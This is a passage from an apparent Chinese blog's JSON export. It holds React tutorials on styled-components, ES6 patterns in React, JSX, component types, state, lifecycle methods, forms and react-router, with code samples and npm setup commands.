'styled-components';import &#123; render &#125; from 'react-dom'; const Title = styled.h1` font-size: 1.5em; text-align: center; color: palevioletred;`;WrapSearchBox=styled.div` width : 200px; // 媒体查询 @media (max-width : 800px)&#123; width : 100%; padding-left:15px; margin-top:-14px; &#125; &gt;div&#123; @media (max-width : 800px)&#123; width : 100% !important; &#125; &#125; &gt;div&gt;input &#123; width:200px !important; padding-left:25px !important; @media (max-width : 800px)&#123; width : 100% !important; &#125;&#125;` class App extends React.Component &#123; render() &#123; return ( &lt;Title&gt;Hello world&lt;/Title&gt; ) &#125;&#125; render( &lt;App /&gt;, document.getElementById('app')); styled.h1是一个标签模板函数 styled.h1函数返回一个React Component，styled components会为这个React Component添加一个class，该class的值为一个随机字符串。传给styled.h1的模板字符串参数的值实际上是CSS语法，这些CSS会附加到该React Component的class中，从而为React Component添加样式 image.png 二、基于 props 定制主题12345678910111213141516const Button = styled.button` background: $&#123;props =&gt; props.primary ? 'palevioletred' : 'white'&#125;; color: $&#123;props =&gt; props.primary ? 'white' : 'palevioletred'&#125;; font-size: 1em; margin: 1em; padding: 0.25em 1em; border: 2px solid palevioletred; border-radius: 3px;`;render( &lt;div&gt; &lt;Button&gt;Normal&lt;/Button&gt; &lt;Button primary&gt;Primary&lt;/Button&gt; &lt;/div&gt;); 1234567891011121314151617export const StyledSlider = styled(Slider)` $&#123;props =&gt; &#123; const theme = props.theme.slider; return css` div.rc-slider-track &#123; background-color: $&#123;theme.themeColor&#125;; &#125; div.rc-slider-handle &#123; border: 2px solid $&#123;theme.themeColor&#125;; &#125; span.rc-slider-dot-active &#123; border-color: $&#123;theme.themeColor&#125;; &#125; `; &#125;&#125;`; 12345678910111213141516171819202122232425262728export const SmallSelectWrapper = styled.div ` // div下面的类样式 .Select-control &#123; height: 30px; &#125; .Select-input &#123; height: 28px; &#125; .Select-value, .Select-placeholder &#123; line-height: 28px !important; &#125; .Select-menu-outer &#123; max-height: 270px; .Select-option.is-disabled &#123; cursor: default; padding-left: .5em; font-weight: bold; color: #333; background: #f8f8f8; &#125; &#125; .Select-menu &#123; max-height:268px; &#125; text-align: left;` 我们在组件中传入的所有 props 都可以在定义组件时获取到，这样就可以很容易实现组件主题的定制。如果没有 styled-components的情况下，需要使用组件 style 属性或者定义多个 class 的方式来实现 三、组件样式继承 通常在 css 中一般会通过给 class传入多个 name 通过空格分隔的方式来复用 class 定义，类似 class=&quot;button tomato&quot;。在 styled-components中利用了 js 的继承实现了这种样式的复用： 12345678910111213const Button = styled.button` color: palevioletred; font-size: 1em; margin: 1em; padding: 0.25em 1em; border: 2px solid palevioletred; border-radius: 3px;`;const TomatoButton = Button.extend` color: tomato; border-color: tomato;`; 子组件中的属性会覆盖父组件中同名的属性 四、组件内部使用 className 在日常开发中总会出现覆盖组件内部样式的需求，你可能想在 styled-components 中使用 className，或者在使用第三方组件时。 1234&lt;Wrapper&gt; &lt;h4&gt;Hello Word&lt;/h4&gt; &lt;div className=\"detail\"&gt;&lt;/div&gt;&lt;/Wrapper&gt; 五、组件中维护其他属性 styled-components 同时支持为组件传入 html 元素的其他属性，比如为 input 元素指定一个 type 属性，我们可以使用 attrs 方法来完成 12345678const Password = styled.input.attrs(&#123; type: 'password',&#125;)` color: palevioletred; font-size: 1em; border: 2px solid palevioletred; border-radius: 3px;`; 在实际开发中，这个方法还有一个有用处，用来引用第三方类库的 css样式： 1234567891011const Button = styled.button.attrs(&#123; className: 'small',&#125;)` background: black; color: white; cursor: pointer; margin: 1em; padding: 0.25em 1em; border: 2px solid black; border-radius: 3px;`; 编译后的 html 结构如下： 123&lt;button class=\"sc-gPEVay small gYllyG\"&gt; Styled Components&lt;/button&gt; 可以用这种方式来使用在别处定义的 small 样式，或者单纯为了识别自己定义的 class，因为正常情况下我们得到的 class名是不可读的编码 六、CSS 动画支持 styled-components 同样对 css 动画中的 @keyframe 做了很好的支持。 12345678910111213import &#123; keyframes &#125; from 'styled-components';const fadeIn = keyframes` 0% &#123; opacity: 0; &#125; 100% &#123; opacity: 1; &#125;`;const FadeInButton = styled.button` animation: 1s $&#123;fadeIn&#125; ease-out;`; 七、兼容现在已有的 react components 和 css 框架 styled-components 采用的 css-module 的模式有另外一个好处就是可以很好的与其他的主题库进行兼容。因为大部分的 css 框架或者css主题都是以 className 的方式进行样式处理的，额外的 className 和主题的 className 并不会有太大的冲突 styled-components 的语法同样支持对一个 React组件进行扩展 12345678910111213141516const StyledDiv = styled(Row)` position: relative; height: 100%; .image img &#123; width: 100%; &#125; .content &#123; min-height: 30em; overflow: auto; &#125; .content h2 &#123; font-size: 1.8em; color: black; margin-bottom: 1em; &#125;`; 八、实战篇extend与styled 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849/*基础组件button*/export const Button = styled.button` border-radius: 3px; padding: 0.25em 1em; margin: 0 1em; background: $&#123;props=&gt;props.primary?\"palevioletred\":\"transparent\"&#125;; color: $&#123;props=&gt;props.primary?\"white\":\"palevioletred\"&#125;; border: 2px solid palevioletred;`;/*扩展按钮的属性，不再原来基础上修改 如在&lt;button class=\"abc con\"&gt;上添加一个con类一样*/export const AButton = styled(Button)` width:200px; height:20px; padding:20px;`/*扩展的结果*/button &#123; border-radius: 3px; padding: 0.25em 1em; margin: 0 1em; background: transparent; color: palevioletred; border: 2px solid palevioletred;&#125;/**添加的扩展属性**/.con &#123; background: yellow;&#125;/*继承按钮的样式并且在原来基础上修改 如在&lt;button class=\"con\"&gt;.con类上叠加属性一样**/export const TomatoButton = Button.extend` width:200px; height:10%;`/*继承的结果 子组件中的属性会覆盖父组件中同名的属性*/button &#123; border-radius: 3px; padding: 0.25em 1em; margin: 0 1em; background: transparent; color: palevioletred; border: 2px solid palevioletred; /*添加的继承属性*/ width: 200px; height: 10%;&#125; 1234567891011121314const Button = styled.button` padding: 10px;`;const TomatoButton = Button.extend` color: #f00;`;/** css写法 **/button &#123; padding: 10px;&#125;button.tomato-button &#123; color: #f00;&#125; 传递属性的两中写法 123&lt;Button primary /&gt;&lt;Button secondary /&gt;&lt;Button primary active=&#123;true&#125; /&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445/*对单个属性的值做判断赋值*/styled.Button` background: $&#123;props =&gt; props.primary ? '#f00' : props.secondary ? '#0f0' : '#00f'&#125;; color: $&#123;props =&gt; props.primary ? '#fff' : props.secondary ? '#fff' : '#000'&#125;; opacity: $&#123;props =&gt; props.active ? 1 : 0&#125;;`;const Button = styled.button` border-radius: 3px; padding: 0.25em 1em; margin: 0 1em; background: transparent; color: palevioletred; border: 2px solid palevioletred; /*可以写一堆属性*/ $&#123;props =&gt; props.primary &amp;&amp; css` background: palevioletred; color: white; `&#125;`;/**css写法**/button &#123; background: #00f; opacity: 0; color: #000;&#125;button.primary,button.seconary &#123; color: #fff;&#125;button.primary &#123; background: #f00;&#125;button.secondary &#123; background: #0f0;&#125;button.active &#123; opacity: 1;&#125; 使用 1&lt;Button primary&gt;&lt;/Button&gt; 九、总结 提出了 container 和 components 的概念，移除了组件和样式之间的映射关系，符合关注度分离的模式； 可以在样式定义中直接引用到 js 变量，共享变量，非常便利； 支持组件之间继承，方便代码复用，提升可维护性； 兼容现有的 className 方式，升级无痛；","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://ru23.com/tags/JavaScript/"},{"name":"react","slug":"react","permalink":"https://ru23.com/tags/react/"}]},{"title":"es6在react中的应用","slug":"2017-11-es-in-react","date":"2017-11-07T13:55:24.000Z","updated":"2018-10-24T03:46:02.209Z","comments":true,"path":"note/57b0b360.html","link":"","permalink":"https://ru23.com/note/57b0b360.html","excerpt":"","text":"一、数组遍历显示1234567891011121314151617import React,&#123;Component&#125; from 'react';class RepeatArray extends Component&#123; constructor() &#123; super(); &#125; render()&#123; const names = ['Alice', 'Emily', 'Kate']; return ( &lt;div&gt; &#123; names.map((name) =&gt;&#123;return &lt;div&gt;Hello, &#123;name&#125;!&lt;/div&gt;;&#125; ) &#125; &lt;/div&gt; ); &#125;&#125;export default RepeatArray; 二、ol与li的实现123456789101112131415161718192021222324252627282930import React,&#123;Component&#125; from 'react';class RepeatLi extends Component&#123; render()&#123; return ( &lt;ol&gt; &#123; this.props.children.map((child)=&gt;&#123;return &lt;li&gt;&#123;child&#125;&lt;/li&gt;&#125;) &#125; &lt;/ol&gt; ); &#125;&#125;class RepeatArray extends Component&#123; constructor() &#123; super(); &#125; render()&#123; return ( &lt;div&gt; &lt;RepeatLi&gt; &lt;span&gt;hello&lt;/span&gt; &lt;span&gt;world&lt;/span&gt; &lt;/RepeatLi&gt; &lt;/div&gt; ); &#125;&#125;export default RepeatArray; 三、从服务端获取数据123456789101112131415161718192021222324252627282930313233343536373839404142import React,&#123;Component&#125; from 'react';class UserGist extends Component&#123; constructor()&#123; super(); this.state=&#123; username:'', lastGistUrl:'' &#125; &#125; componentWillMount()&#123; $.get(this.props.source, function(result) &#123; var lastGist = result[0]; //if (this.isMounted()) &#123; this.setState(&#123; username: lastGist.owner.login, lastGistUrl: lastGist.html_url &#125;); //&#125; &#125;.bind(this)); &#125; render()&#123; return( &lt;div&gt; &#123;this.state.username&#125; .. &lt;a href=&#123;this.state.lastGistUrl&#125; &gt;here&lt;/a&gt; &lt;/div&gt; ); &#125;&#125;class RepeatArray extends Component&#123; constructor() &#123; super(); &#125; render()&#123; return ( &lt;div&gt; &lt;UserGist source=\"https://api.github.com/users/octocat/gists\" /&gt; &lt;/div&gt; ); &#125;&#125;export default RepeatArray; 四、初始化STATE12345678class Video extends React.Component &#123; constructor(props)&#123; super(props); this.state = &#123; loopsRemaining: this.props.maxLoops, &#125;; &#125;&#125; 五、解构与扩展操作符 在给子组件传递一批属性更为方便了。下面的例子把className以外的所有属性传递给div标签 1234567891011121314class AutoloadingPostsGrid extends React.Component &#123; render() &#123; var &#123; className, ...others, // contains all properties of this.props except for className &#125; = this.props; return ( &lt;div className=&#123;className&#125;&gt; &lt;PostsGrid &#123;...others&#125; /&gt; &lt;button onClick=&#123;this.handleLoadMoreClick&#125;&gt;Load more&lt;/button&gt; &lt;/div&gt; ); &#125;&#125; 使用react开发最常见的问题就是父组件要传给子组件的属性较多时比较麻烦 12345678class MyComponent extends React.Component&#123;//假设MyComponent已经有了name和age属性 render()&#123; return ( &lt;SubComponent name=&#123;this.props.name&#125; age=&#123;this.props.age&#125;/&gt; ) &#125;&#125; 使用扩展操作符可以变得很简单 12345678class MyComponent extends React.Component&#123;//假设MyComponent已经有了name和age属性 render()&#123; return ( &lt;SubComponent &#123;...this.props&#125;/&gt; ) &#125;&#125; 上述方式是将父组件的所有属性都传递下去，如果这其中有些属性我不需要传递呢？也很简单 123456789class MyComponent extends React.Component&#123;//假设MyComponent有很多属性，而name属性不需要传递给子组件 var &#123;name,...MyProps&#125;=this.props; render()&#123; return ( &lt;SubComponent &#123;...Myprops&#125;/&gt; ) &#125;&#125; 上述方法最常用的场景就是父组件的class属性需要被单独提取出来作为某个元素的class，而其他属性需要传递给子组件 六、创建组件1234import React,&#123;Component&#125; from \"react\";class MyComponent extends Component&#123;//组件内部代码&#125; 七、State/Props/PropTypes es6允许将props和propTypes当作静态属性在类外初始化 123456789class MyComponent extends React.Component&#123;&#125;MyComponent.defaultProps=&#123; name:\"SunnyChuan\", age:22&#125;;MyComponent.propTypes=&#123; name:React.PropTypes.string.isRequired, age:React.PropTypes.number.isRequired&#125;; es7支持直接在类中使用变量表达式 12345678910class MyComponent extends React.Component&#123; static defaultProps=&#123; name:\"SunnyChuan\", age:22 &#125; static propTypes=&#123; name:React.PropTypes.string.isRequired, age:React.PropTypes.number.isRequired &#125;&#125; state和前两个不同，它不是静态的 12345678910111213class MyComponent extends React.Component&#123; static defaultProps=&#123; name:\"SunnyChuan\", age:22 &#125; state=&#123; isMarried:false &#125; static propTypes=&#123; name:React.PropTypes.string.isRequired, age:React.PropTypes.number.isRequired &#125;&#125; 七、当你构建通用容器时，扩展属性会非常有用12345678function App1() &#123; return &lt;Greeting firstName=\"Ben\" lastName=\"Hector\" /&gt;;&#125;function App2() &#123; const props = &#123;firstName: 'Ben', lastName: 'Hector'&#125;; return &lt;Greeting &#123;...props&#125; /&gt;;&#125; 八、使用es6的计算属性代替12345678this.setState(&#123; [name]:value&#125;)//代替var partialState = &#123;&#125;;partialState[name] = value;this.setState(partialState);","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://ru23.com/tags/JavaScript/"},{"name":"react","slug":"react","permalink":"https://ru23.com/tags/react/"}]},{"title":"react知识点回顾","slug":"2017-11-react-summary","date":"2017-11-07T11:55:24.000Z","updated":"2018-10-24T03:46:02.275Z","comments":true,"path":"note/eb2df852.html","link":"","permalink":"https://ru23.com/note/eb2df852.html","excerpt":"","text":"来源于互联网 一、npm的配置 切换淘宝镜像源 12345npm config set registry https://registry.npm.taobao.orgnpm config get registrynpm install -g cnpm --registry=https://registry.npm.taobao.org 使用npm安装react 1cnpm install react react-dom --save 二、开发环境配置 这里使用create-react-app初始化项目 1npm install create-react-app -g 安装完成之后就可以在命令行使用 create-react-app 了，首先选择一个合适的目录，然后只需要简单地输入 1create-react-app yourfilename 三、认识JSX3.1 JSX 简介 JSX 其是一个语法扩展，它既不是单纯的字符串，也不是HTML，虽然长得和 HTML 很像甚至基本上看起来一样。但事实上它是 React 内部实现的一种，允许我们直接在 JS 里书写 UI 的方式 3.2 JSX 属性 JSX 的标签同样可以拥有自己的属性 1const title = &lt;h1 id=\"main\"&gt;React Learning&lt;/h1&gt; 12// 注意是 className 而不是 classconst title = &lt;h1 className=\"main\"&gt;React Learning&lt;/h1&gt; 3.3 JSX 嵌套 JSX 的标签也可以像 HTML 一样相互嵌套，一般有嵌套解构的 JSX 元素外面，我们习惯于为它加上一个小括号 123456const title = ( &lt;div&gt; &lt;h1 className=\"main\"&gt;React Learning&lt;/h1&gt; &lt;p&gt;Let's learn JSX&lt;/p&gt; &lt;/div&gt;) 需要注意的是，JSX 在嵌套时，最外层有且只能有一个标签，否则就会出错 12345// 这是一个错误示例const title = ( &lt;h1 className=\"main\"&gt;React Learning&lt;/h1&gt; &lt;p&gt;Let's learn JSX&lt;/p&gt;) 3.4 JSX表达式 在 JSX 元素中，我们同样可以使用 JavaScript 表达式，在 JSX 当中的表达式需要用一个大括号括起来 12345678910function sayhi(name) &#123; return 'Hi,' + name&#125;const title = ( &lt;div&gt; &lt;h1 className=\"main\"&gt;React Learning&lt;/h1&gt; &lt;p&gt;Let's learn JSX. &lt;span&gt;&#123;sayhi('you')&#125;&lt;/span&gt;&lt;/p&gt; &lt;/div&gt;) 四、组件类型4.1 函数定义与类定义组件 第一种函数定义组件，非常简单啦，我们只需要定义一个接收props传值，返回React元素的方法即可 123function Title(props) &#123; return &lt;h1&gt;Hello, &#123;props.name&#125;&lt;/h1&gt;&#125; 12// 甚至使用ES6的箭头函数简写之后可以变成这样const Title = props =&gt; &lt;h1&gt;Hello, &#123;props.name&#125;&lt;/h1&gt; 第二种是类定义组件，也就是使用ES6中新引入的类的概念来定义React组件 组件在定义好之后，可以通过JSX描述的方式被引用，组件之间也可以相互嵌套和组合 12345class Title extends React.Component &#123; render() &#123; return &lt;h1&gt;Hello, &#123;this.props.name&#125;&lt;/h1&gt; &#125;&#125; 4.2 展示与容器组件12345678910111213141516// 展示组件class CommentList extends React.Component &#123; constructor(props) &#123; super(props) &#125; renderComment(&#123;body, author&#125;) &#123; return &lt;li&gt;&#123;body&#125;—&#123;author&#125;&lt;/li&gt; &#125; render() &#123; return &lt;ul&gt; &#123;this.props.comments.map(this.renderComment)&#125; &lt;/ul&gt; &#125; &#125; 123456789101112131415161718192021// 容器组件class CommentListContainer extends React.Component &#123; constructor() &#123; super() this.state = &#123; comments: [] &#125; &#125; componentDidMount() &#123; $.ajax(&#123; url: \"/my-comments.json\", dataType: 'json', success: function(comments) &#123; this.setState(&#123;comments: comments&#125;) &#125;.bind(this) &#125;) &#125; render() &#123; return &lt;CommentList comments=&#123;this.state.comments&#125; /&gt; &#125;&#125; 展示组件 主要负责组件内容如何展示 从props接收父组件传递来的数据 大多数情况可以通过函数定义组件声明 容器组件 主要关注组件数据如何交互 拥有自身的state，从服务器获取数据，或与redux等其他数据处理模块协作 需要通过类定义组件声明，并包含生命周期函数和其他附加方法 那么这样写具体有什么好处呢？ 解耦了界面和数据的逻辑 更好的可复用性，比如同一个回复列表展示组件可以套用不同数据源的容器组件 利于团队协作，一个人负责界面结构，一个人负责数据交互 4.3 有状态与无状态组件有状态组件 这个组件能够获取储存改变应用或组件本身的状态数据，在React当中也就是state，一些比较明显的特征是我们可以在这样的组件当中看到对this.state的初始化，或this.setState方法的调用 无状态组件 这样的组件一般只接收来自其他组件的数据。一般这样的组件中只能看到对this.props的调用 12345678910111213141516171819202122// 有状态组件class StatefulLink extends React.Component &#123; constructor(props) &#123; super(props) this.state = &#123; active: false &#125; &#125; handleClick() &#123; this.setState(&#123; active: !this.state.active &#125;) &#125; render() &#123; return &lt;a style=&#123;&#123; color: this.state.active ? 'red' : 'black' &#125;&#125; onClick=&#123;this.handleClick.bind(this)&#125; &gt; Stateful Link &lt;/a&gt; &#125;&#125; 12345678910111213141516171819202122// 无状态组件class StatelessLink extends React.Component &#123; constructor(props) &#123; super(props) &#125; handleClick() &#123; this.props.handleClick(this.props.router) &#125; render() &#123; const active = this.props.activeRouter === this.props.router return ( &lt;li&gt; &lt;a style=&#123;&#123; color: active ? 'red' : 'black' &#125;&#125; onClick=&#123;this.handleClick.bind(this)&#125; &gt; Stateless Link &lt;/a&gt; &lt;/li&gt; ) &#125;&#125; 在React的实际开发当中，我们编写的组件大部分都是无状态组件。毕竟React的主要作用是编写用户界面。再加上ES6的新特性，绝大多数的无状态组件都可以通过箭头函数简写成类似下面这样 1const SimpleButton = props =&gt; &lt;button&gt;&#123;props.text&#125;&lt;/button&gt; 4.4 受控与非受控组件受控组件 比如说设置了value的&lt;input&gt; 是一个受控组件。对于受控的&lt;input&gt;，渲染出来的html元素始终保持着value属性的值，如以下代码 image 此时如果想要更新用户的值。需要使用onChange事件 image 非受控组件 即没有设置value或者设置为null的是一个非受控组件，对于非受控的input组件，用户的输入会直接反映在页面上 image 上面的代码渲染出一个空值的输入框，用户的输入立即会反映在元素上 和受控组件一样，使用onChange事件来监听值的变化，如果想要给组件设置一个非空的初始值。可以使用defaultValue属 通常情况下，React当中所有的表单控件都需要是受控组件 4.5 组合与继承 React当中的组件是通过嵌套或组合的方式实现组件代码复用的 通过props传值和组合使用组件几乎可以满足所有场景下的需求。这样也更符合组件化的理念，就好像使用互相嵌套的DOM元素一样使用React的组件，并不需要引入继承的概念 继承的写法并不符合React的理念。在React当中props其实是非常强大的，props几乎可以传入任何东西，变量、函数、甚至是组件本身 123456789101112131415161718192021222324function SplitPane(props) &#123; return ( &lt;div className=\"SplitPane\"&gt; &lt;div className=\"SplitPane-left\"&gt; &#123;props.left&#125; &lt;/div&gt; &lt;div className=\"SplitPane-right\"&gt; &#123;props.right&#125; &lt;/div&gt; &lt;/div&gt; )&#125;function App() &#123; return ( &lt;SplitPane left=&#123; &lt;Contacts /&gt; &#125; right=&#123; &lt;Chat /&gt; &#125; /&gt; )&#125; React官方也希望我们通过组合的方式来使用组件，如果你想实现一些非界面类型函数的复用，可以单独写在其他的模块当中在引入组件进行使用 五、组件数据 5.1 props 传入变量 传入函数 传入组件 props.children 在形式上，props之于JSX就相当于attributes之于HTML。从写法上来看呢，我们为组件传入props就可以像为HTML标签添加属性一样 在概念上，props对于组件就相当于JS中参数之于函数。我们可以抽象出这样一个函数来解释 props 几乎可以传递所有的内容，包括变量、函数、甚至是组件本身 props是只读的 在React中，props都是自上向下传递，从父组件传入子组件 并且props是只读的，我们不能在组件中直接修改props的内容 也即是说组件只能根据传入的props渲染界面，而不能在其内部对props进行修改 props类型检查 正是因为props的强大，什么类型的内容都可以传递，所以在开发过程中，为了避免错误类型的内容传入，我们可以为props添加类型检查 props默认值 由于props是只读的，我们不能直接为props赋值。React专门准备了一个方法定义props的默认值 123456789101112import React from 'react'import PropTypes from 'prop-types'const Title = props =&gt; &lt;h1&gt;&#123;props.title&#125;&lt;/h1&gt;Title.defaultProps = &#123; title: 'Wait for parent to pass props.'&#125;Title.propTypes = &#123; title: PropTypes.string.isRequired&#125; 5.2 state 初始化 setState方法 向下传递数据 在React中state也是我们进行数据交互的地方，又或者叫做state management状态管理。 一个应用需要进行数据交互，比如同服务器之间的交互，同用户输入进行交互。话反过来，从API获取数据，处理用户输入也就是我们需要用到state的时候 在新版本的React当中，我们通过类定义组件来声明一个有状态组件，之后在它的构造方法中初始化组件的state，我们可以先赋予它默认值。 之后就可以在组件中通过this.state来访问它，既然是state那么肯定涉及到数据的改变，因此我们还需额外定义一个负责处理state变化的函数，这样的函数中一般都会包含this.setState这个方法 和之前的props一样，初始化state之后，如果我们想改变它，是不可以直接对其赋值的，直接修改state的值没有任何意义，因为这样的操作脱离了React运行的逻辑，不会触发组件的重新渲染。所以需要this.setState这个方法，在改变state的同时，触发React内部的一系列函数，最后在页面上重新渲染出组件 1234567891011121314151617181920212223242526class Counter extends React.Component &#123; constructor(props) &#123; super(props) this.state = &#123; counter: 0 &#125; &#125; addOne() &#123; this.setState((prevState) =&gt;(&#123; counter: prevState.counter + 1 &#125;)) &#125; render() &#123; return ( &lt;div&gt; &lt;p&gt;&#123; this.state.counter &#125;&lt;/p&gt; &lt;button onClick=&#123;() =&gt; this.addOne()&#125;&gt; Increment &lt;/button&gt; &lt;/div&gt; ) &#125;&#125; 六、组件生命周期6.1 React是如何渲染组件的 在新版本的React当中，React的底层被重写了。React换上了一个新的引擎，这个引擎叫做React Fiber.React Fiber 作用的也即是React最核心的功能，它将React应用界面更新的过程分为了两个主要的部分： 调度过程 执行过程 在调度过程中，有4个生命周期函数会被触发 componentWillMount componentWillReceiveProps shouldComponentUpdate componentWillUpdate 在执行过程中，有3个生命周期函数会被触发： componentDidMount componentDidUpdate componentWillUnmount 6.2 React组件生命周期方法 React为了方便我们更好地控制自己的应用，提供了许多预置的生命周期方法。这些固定的生命周期方法分别会在组件的挂载流程、更新流程、卸载流程中触发 componentWillMount 开始插入真实DOM componentDidMount 插入真实DOM完成 componentWillUpdate 开始重新渲染 componentDidUpdate 重新渲染完成 componentWillUnmount已移出真实 DOM componentWillReceiveProps 已加载组件收到新的参数时调用 shouldComponentUpdate组件判断是否重新渲染时调用 image.png componentDidMount 在此方法中可进行 与其他 JavaScript 框架集成，如初始化 jQuery 插件； 使用 setTimeout/setInterval 设置定时器； 通过 Ajax/Fetch 获取数据； 绑定 DOM 事件 6.3 总结 React组件渲染包含三个流程：挂载流程、更新流程、卸载流程 各个生命周期函数会在特定的时刻触发并适用于不同的使用场景 通过使用生命周期函数我们可以对应用进行更精准的控制 如果你需要发起网络请求，将其安排在合适的生命周期函数中是值得推荐的做法 了解掌握React组件渲染的流程和原理对我们更深入掌握React非常有帮助 七、表单及事件处理7.1 表单 受控与非受控组件就是专门适用于React当中的表单元素的 只要是有表单出现的地方，就会有用户输入，就会有表单事件触发，就会涉及的数据处理 在我们用React开发应用时，为了更好地管理应用中的数据，响应用户的输入，编写组件的时候呢，我们就会运用到受控组件与非受控组件这两个概念。 7.2 表单元素 我们在组件中声明表单元素时，一般都要为表单元素传入应用状态中的值，可以通过state也可以通过props传递，之后需要为其绑定相关事件，例如表单提交，输入改变等。在相关事件触发的处理函数中，我们需要根据表单元素中用户的输入，对应用数据进行相应的操作和改变 12345678910111213141516171819202122class ControlledInput extends React.Component &#123; constructor(props) &#123; super(props) this.state = &#123; value: \"\" &#125; &#125; handleChange(event) &#123; this.setState(&#123; value: event.target.value &#125;) &#125; render() &#123; return &lt;input type=\"text\" value=&#123;this.state.value&#125; onChange=&#123;() =&gt; this.handleChange()&#125; /&gt; &#125;&#125; 受控组件的输入数据是一直和我们的应用状态绑定的，事件处理函数中一定要有关state的更新操作，这样表单组件才能及时正确响应用户的输入 textarea 1234567&lt;!--HTML--&gt;&lt;textarea&gt; Hello there, this is some text in a text area&lt;/textarea&gt;&lt;!--jsx--&gt;&lt;textarea value=&#123;this.state.value&#125; onChange=&#123;this.handleChange&#125; /&gt; select 123456789101112131415&lt;!--HTML--&gt;&lt;select&gt; &lt;option value=\"grapefruit\"&gt;Grapefruit&lt;/option&gt; &lt;option value=\"lime\"&gt;Lime&lt;/option&gt; &lt;option selected value=\"coconut\"&gt;Coconut&lt;/option&gt; &lt;option value=\"mango\"&gt;Mango&lt;/option&gt;&lt;/select&gt;&lt;!--jsx--&gt;&lt;select value=&#123;this.state.value&#125; onChange=&#123;this.handleChange&#125;&gt; &lt;option value=\"grapefruit\"&gt;Grapefruit&lt;/option&gt; &lt;option value=\"lime\"&gt;Lime&lt;/option&gt; &lt;option value=\"coconut\"&gt;Coconut&lt;/option&gt; &lt;option value=\"mango\"&gt;Mango&lt;/option&gt;&lt;/select&gt; 7.3 事件123456789&lt;!--HTML--&gt;&lt;button onclick=\"activateLasers()\"&gt; Activate Lasers&lt;/button&gt;&lt;!--jsx--&gt;&lt;button onClick=&#123;activateLasers&#125;&gt; Activate Lasers&lt;/button&gt; 八、redux-router react-router 8.1、基本用法 使用时，路由器Router就是React的一个组件 12import &#123; Router &#125; from 'react-router';render(&lt;Router/&gt;, document.getElementById('app')); Router组件本身只是一个容器，真正的路由要通过Route组件定义 1234567import &#123; Router, Route, hashHistory &#125; from 'react-router';render(( &lt;Router history=&#123;hashHistory&#125;&gt; &lt;Route path=\"/\" component=&#123;App&#125;/&gt; &lt;/Router&gt;), document.getElementById('app')); 上面代码中，用户访问根路由/，组件APP就会加载到document.getElementById(&#39;app&#39;) Router组件有一个参数history，它的值hashHistory表示，路由的切换由URL的hash变化决定，即URL的#部分发生变化 Route组件定义了URL路径与组件的对应关系。你可以同时使用多个Route组件 12345&lt;Router history=&#123;hashHistory&#125;&gt; &lt;Route path=\"/\" component=&#123;App&#125;/&gt; &lt;Route path=\"/repos\" component=&#123;Repos&#125;/&gt; &lt;Route path=\"/about\" component=&#123;About&#125;/&gt;&lt;/Router&gt; 上面代码中，用户访问/repos（比如http://localhost:8080/#/repos）时，加载Repos组件；访问/about（http://localhost:8080/#/about）时，加载About组件 8.2、嵌套路由 Route组件还可以嵌套 123456&lt;Router history=&#123;hashHistory&#125;&gt; &lt;Route path=\"/\" component=&#123;App&#125;&gt; &lt;Route path=\"/repos\" component=&#123;Repos&#125;/&gt; &lt;Route path=\"/about\" component=&#123;About&#125;/&gt; &lt;/Route&gt;&lt;/Router&gt; 上面代码中，用户访问/repos时，会先加载App组件，然后在它的内部再加载Repos组件 123&lt;App&gt; &lt;Repos/&gt;&lt;/App&gt; App组件要写成下面的样子 1234567export default React.createClass(&#123; render() &#123; return &lt;div&gt; &#123;this.props.children&#125; &lt;/div&gt; &#125;&#125;) App组件的this.props.children属性就是子组件 8.3、 path 属性 Route组件的path属性指定路由的匹配规则。这个属性是可以省略的，这样的话，不管路径是否匹配，总是会加载指定组件 Route组件的path属性指定路由的匹配规则。这个属性是可以省略的，这样的话，不管路径是否匹配，总是会加载指定组件 123&lt;Route path=\"inbox\" component=&#123;Inbox&#125;&gt; &lt;Route path=\"messages/:id\" component=&#123;Message&#125; /&gt;&lt;/Route&gt; 当用户访问/inbox/messages/:id时，会加载下面的组件 123&lt;Inbox&gt; &lt;Message/&gt;&lt;/Inbox&gt; 如果省略外层Route的path参数，写成下面的样子 123&lt;Route component=&#123;Inbox&#125;&gt; &lt;Route path=\"inbox/messages/:id\" component=&#123;Message&#125; /&gt;&lt;/Route&gt; 现在用户访问/inbox/messages/:id时，组件加载还是原来的样子 123&lt;Inbox&gt; &lt;Message/&gt;&lt;/Inbox&gt; 8.4、通配符 path属性可以使用通配符 123456789101112131415161718192021&lt;Route path=\"/hello/:name\"&gt;// 匹配 /hello/michael// 匹配 /hello/ryan&lt;Route path=\"/hello(/:name)\"&gt;// 匹配 /hello// 匹配 /hello/michael// 匹配 /hello/ryan&lt;Route path=\"/files/*.*\"&gt;// 匹配 /files/hello.jpg// 匹配 /files/hello.html&lt;Route path=\"/files/*\"&gt;// 匹配 /files/ // 匹配 /files/a// 匹配 /files/a/b&lt;Route path=\"/**/*.jpg\"&gt;// 匹配 /files/hello.jpg// 匹配 /files/path/to/file.jpg 通配符的规则如下 :paramName :paramName匹配URL的一个部分，直到遇到下一个/、?、#为止。这个路径参数可以通过this.props.params.paramName取出 () ()表示URL的这个部分是可选的 匹配任意字符，直到模式里面的下一个字符为止。匹配方式是非贪婪模式 匹配任意字符，直到下一个/、?、#为止。匹配方式是贪婪模式 path属性也可以使用相对路径（不以/开头），匹配时就会相对于父组件的路径。嵌套路由如果想摆脱这个规则，可以使用绝对路由 此外，URL的查询字符串/foo?bar=baz，可以用this.props.location.query.bar获取 8.5、IndexRoute 组件123456&lt;Router&gt; &lt;Route path=\"/\" component=&#123;App&#125;&gt; &lt;Route path=\"accounts\" component=&#123;Accounts&#125;/&gt; &lt;Route path=\"statements\" component=&#123;Statements&#125;/&gt; &lt;/Route&gt;&lt;/Router&gt; 上面代码中，访问根路径/，不会加载任何子组件。也就是说，App组件的this.props.children，这时是undefined 因此，通常会采用{this.props.children || &lt;Home/&gt;}这样的写法。这时，Home明明是Accounts和Statements的同级组件，却没有写在Route中 IndexRoute就是解决这个问题，显式指定Home是根路由的子组件，即指定默认情况下加载的子组件。你可以把IndexRoute想象成某个路径的index.html 1234567&lt;Router&gt; &lt;Route path=\"/\" component=&#123;App&#125;&gt; &lt;IndexRoute 